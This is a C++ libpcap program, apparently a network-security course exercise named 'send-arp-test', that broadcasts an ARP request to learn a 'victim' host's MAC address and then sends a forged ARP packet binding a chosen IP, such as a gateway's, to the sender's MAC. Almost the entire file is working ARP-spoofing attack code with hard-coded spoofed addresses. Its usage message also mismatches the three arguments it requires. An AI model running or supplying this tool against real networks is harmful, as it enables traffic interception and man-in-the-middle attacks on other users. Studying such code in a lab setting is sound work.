#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "get_ip_mac.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	char my_mac[18];
	char victim_mac[18];
	char broadcast_mac[18]= "FF:FF:FF:FF:FF:FF";
	char unknown_mac[18] = "00:00:00:00:00:00";
	get_mac(dev, my_mac);
	
	char my_ip[32];
	get_ip(dev, my_ip);
	
	

	


	EthArpPacket victim_mac_ask;

	victim_mac_ask.eth_.dmac_ = Mac(broadcast_mac);
	//victim_mac_ask.eth_.smac_ = Mac(my_mac);
	victim_mac_ask.eth_.smac_ = Mac("90:de:80:9d:49:d7");
	victim_mac_ask.eth_.type_ = htons(EthHdr::Arp);

	victim_mac_ask.arp_.hrd_ = htons(ArpHdr::ETHER);
	victim_mac_ask.arp_.pro_ = htons(EthHdr::Ip4);
	victim_mac_ask.arp_.hln_ = Mac::Size;
	victim_mac_ask.arp_.pln_ = Ip::Size;
	victim_mac_ask.arp_.op_ = htons(ArpHdr::Request);
	victim_mac_ask.arp_.smac_ = Mac(my_mac);
	//victim_mac_ask.arp_.sip_ = htonl(Ip(my_ip));
	victim_mac_ask.arp_.sip_ = htonl(Ip("10.3.3.41"));
	victim_mac_ask.arp_.tmac_ = Mac(unknown_mac);
	victim_mac_ask.arp_.tip_ = htonl(Ip(argv[2]));

	printf("%s\n", std::string(Mac(my_mac)).c_str());
	printf("%s\n", std::string(Mac(broadcast_mac)).c_str());
	printf("%s\n", std::string(Mac(unknown_mac)).c_str());
	printf("%s\n", std::string(Ip(my_ip)).c_str());
	printf("%s\n", std::string(Ip(argv[2])).c_str());

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&victim_mac_ask), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet); //packet receive
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

		//packet으로 받은걸 구조체에 맞게 매핑?하는 방법
		EthHdr eth;
		memcpy(&eth, packet, sizeof(eth)); 
		
		
		ArpHdr arp;
		memcpy(&arp, (packet + 14), sizeof(arp));
		
		
		if(arp.hrd() != ArpHdr::ETHER){
			continue;
		} 
		if(arp.pro() != EthHdr::Ip4){
			continue;
		}
		if(arp.op() != ArpHdr::Reply){
			continue;
		} 
		if(Ip(argv[2]) == arp.sip() && Ip(my_ip) == arp.tip() && Mac(my_mac) == arp.tmac()){
			snprintf(victim_mac, sizeof(victim_mac),"%02x:%02x:%02x:%02x:%02x:%02x", packet[6],packet[7],packet[8],packet[9],packet[10],packet[11]);
			printf("%s", victim_mac);
			break;
		} 
		
	}
	printf("%s", victim_mac);
	
	EthArpPacket attack_;

	attack_.eth_.dmac_ = Mac(victim_mac);
	attack_.eth_.smac_ = Mac("90:de:80:9d:49:d7");
	//attack_.eth_.smac_ = Mac(my_mac);
	attack_.eth_.type_ = htons(EthHdr::Arp);

	attack_.arp_.hrd_ = htons(ArpHdr::ETHER);
	attack_.arp_.pro_ = htons(EthHdr::Ip4);
	attack_.arp_.hln_ = Mac::Size;
	attack_.arp_.pln_ = Ip::Size;
	attack_.arp_.op_ = htons(ArpHdr::Request);
	attack_.arp_.smac_ = Mac(my_mac);
	attack_.arp_.sip_ = htonl(Ip(argv[3]));
	attack_.arp_.tmac_ = Mac(victim_mac);
	attack_.arp_.tip_ = htonl(Ip(argv[2]));
		
	res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
	pcap_close(pcap);
}
